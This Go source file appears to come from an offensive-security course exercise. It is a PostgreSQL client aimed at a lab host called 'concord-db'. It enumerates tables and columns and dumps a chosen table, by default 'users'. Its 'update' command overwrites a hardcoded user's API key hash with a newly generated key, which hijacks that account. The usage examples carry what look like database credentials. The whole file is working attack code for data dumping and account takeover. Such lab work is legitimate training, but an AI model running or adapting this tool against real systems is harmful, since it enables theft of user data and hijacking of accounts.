package main

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/uptrace/bun"
	"github.com/uptrace/bun/dialect/pgdialect"
	"github.com/uptrace/bun/driver/pgdriver"
	"github.com/uptrace/bun/extra/bundebug"
	"log"
	"os"
	"strings"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 11.2.5.2 - Extra Mile: PG client to add user

func getTables(ctx context.Context, db *bun.DB) {
	// "SELECT table_name FROM information_schema.tables"
	var tableNames []string
	err := db.NewSelect().
		TableExpr("information_schema.tables").
		ColumnExpr("table_name").
		Scan(ctx, &tableNames)

	if err != nil {
		log.Fatalln("Failed to get table names: ", err)
	}

	utils.PrintInfo("Tables:")
	for _, tableName := range tableNames {
		fmt.Println(tableName)
	}
}

var columns []struct {
	ColumnName string `bun:"column_name"`
	DataType   string `bun:"data_type"`
}

func getColumns(ctx context.Context, db *bun.DB, table string) {
	err := db.NewSelect().
		TableExpr("information_schema.columns").
		ColumnExpr("column_name").
		ColumnExpr("data_type").
		Where("table_name = ?", table).
		Scan(ctx, &columns)

	if err != nil {
		log.Fatalln("Failed to get column names: ", err)
	}

	utils.PrintInfo("Columns:")
	for _, col := range columns {
		fmt.Printf("%s (%s)\n", col.ColumnName, col.DataType)
	}
}

func dumpTable(ctx context.Context, db *bun.DB, table string) {
	var rows []map[string]interface{}

	query := ""
	for _, col := range columns {
		query += col.ColumnName + ","
	}
	query = strings.TrimSuffix(query, ",")

	err := db.NewSelect().
		ColumnExpr(query).
		Table(table).
		Scan(ctx, &rows)

	if err != nil {
		log.Fatal(err)
	}

	// Print the table contents dynamically
	for _, row := range rows {
		// Iterate over the map and print each column's name and value
		for columnName, columnValue := range row {
			fmt.Printf("%s: %v\n", columnName, columnValue)
		}
		fmt.Println()
	}
}

func update(ctx context.Context, db *bun.DB, table, targetUUID, apiKeyHash string) {
	_, err := db.NewUpdate().
		Column("api_key").
		TableExpr(table).
		Set("api_key = ?", apiKeyHash).
		Where("user_id = ?", targetUUID).
		Returning("NULL").
		Exec(ctx)

	if err != nil {
		log.Fatalln("Failed to update: ", err)
	}
}

func generateSecureRandom() string {
	randomBytes := make([]byte, 16)

	_, err := rand.Read(randomBytes)
	if err != nil {
		log.Fatalln("Failed to generate random string", err)
	}

	randomString := base64.RawStdEncoding.EncodeToString(randomBytes)

	return randomString
}

func generateAPIKeyHash(key string) string {
	decodedBytes, err := base64.RawStdEncoding.DecodeString(key)
	if err != nil {
		log.Fatalln("Failed to decode base64 key: ", err)
	}

	hasher := sha256.New()
	_, err = hasher.Write(decodedBytes)
	if err != nil {
		log.Fatalln("Failed to generate SHA256 hash: ", err)
	}

	hashBytes := hasher.Sum(nil)

	return base64.RawStdEncoding.EncodeToString(hashBytes)
}

func main() {
	addr := "concord-db"
	database := "postgres"
	user := flag.String("user", "", "PG user")
	pass := flag.String("pass", "", "PG password")
	command := flag.String("command", "getTables", "command to run")
	table := flag.String("table", "users", "fetch table columns")

	// parse args
	flag.Parse()
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 3 {
		utils.PrintFailure(fmt.Sprintf("usage: %s -user=<username> -pass=<password>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s -user=postgres -pass=quake1quake2quake3arena", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s -command=getColumns -user=postgres -pass=quake1quake2quake3arena", os.Args[0]))
		os.Exit(1)
	}

	ctx := context.Background()

	// open a PostgreSQL database.
	dsn := fmt.Sprintf("postgres://%s:5432/%s", addr, database)
	pgconn := pgdriver.NewConnector(
		pgdriver.WithDSN(dsn),
		pgdriver.WithUser(*user),
		pgdriver.WithPassword(*pass),
		pgdriver.WithInsecure(true))
	pgdb := sql.OpenDB(pgconn)

	// create a Bun db on top of it.
	db := bun.NewDB(pgdb, pgdialect.New())

	// print all queries to stdout.
	db.AddQueryHook(bundebug.NewQueryHook(bundebug.WithVerbose(true)))

	// run respective functions
	if *command == "getTables" {
		getTables(ctx, db)
	} else if *command == "getColumns" {
		getColumns(ctx, db, *table)
	} else if *command == "dumpTable" {
		getColumns(ctx, db, *table)
		dumpTable(ctx, db, *table)
	} else if *command == "update" {
		apiKey := generateSecureRandom()
		apiKeyHash := generateAPIKeyHash(apiKey)
		utils.PrintInfo("API Key: " + apiKey)
		utils.PrintInfo("API Key Hash: " + apiKeyHash)
		update(ctx, db, *table, "230c5c9c-d9a7-11e6-bcfd-bb681c07b26c", apiKeyHash)
		utils.PrintInfo("Updated, please check...")
	}
}
